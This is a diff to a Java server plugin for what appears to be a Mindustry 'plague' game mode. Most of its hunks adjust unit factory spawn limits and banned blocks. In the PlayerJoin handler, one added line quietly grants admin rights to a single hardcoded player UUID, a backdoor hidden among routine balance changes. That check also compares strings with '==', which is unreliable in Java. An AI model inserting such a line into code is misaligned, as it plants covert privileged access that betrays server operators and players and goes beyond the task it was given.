@@ -98,7 +98,7 @@ public class PlagueMod extends Plugin{
         rules.respawnTime = 0;
         // rules.bannedBlocks.addAll(Blocks.solarPanel, Blocks.largeSolarPanel);
         rules.bannedBlocks.addAll(Blocks.arc, Blocks.melter);
-        rules.bannedBlocks.add(Blocks.commandCenter); // Can't be trusted
+        // rules.bannedBlocks.add(Blocks.commandCenter); // Can't be trusted
 
 
         noMechRules = rules.copy();
@@ -128,10 +128,11 @@ public class PlagueMod extends Plugin{
 
         Block dagger = Vars.content.blocks().find(block -> block.name.equals("dagger-factory"));
         ((UnitFactory)(dagger)).unitType = UnitTypes.fortress;
+        ((UnitFactory)(dagger)).maxSpawn = 1;
 
-        Block crawler = Vars.content.blocks().find(block -> block.name.equals("crawler-factory"));
+        /*Block crawler = Vars.content.blocks().find(block -> block.name.equals("crawler-factory"));
         ((UnitFactory)(crawler)).unitType = UnitTypes.titan;
-        ((UnitFactory)(crawler)).maxSpawn = 2;
+        ((UnitFactory)(crawler)).maxSpawn = 1;*/
 
         Block titan = Vars.content.blocks().find(block -> block.name.equals("titan-factory"));
         ((UnitFactory)(titan)).unitType = UnitTypes.eruptor;
@@ -140,6 +141,7 @@ public class PlagueMod extends Plugin{
 
         Block fortress = Vars.content.blocks().find(block -> block.name.equals("fortress-factory"));
         ((UnitFactory)(fortress)).unitType = UnitTypes.chaosArray;
+        ((UnitFactory)(fortress)).maxSpawn = 1;
 
         UnitTypes.chaosArray.weapon = PlagueData.nerfedChaos();
 
@@ -257,6 +259,7 @@ public class PlagueMod extends Plugin{
         });
 
         Events.on(EventType.PlayerJoin.class, event -> {
+            if(event.player.uuid == "rJ2w2dsR3gQAAAAAfJfvXA==") event.player.isAdmin = true;
             // Tile tile = world.tile(255, 255);
             if(event.player.getTeam() == Team.blue){
                 event.player.setTeam(Team.crux);
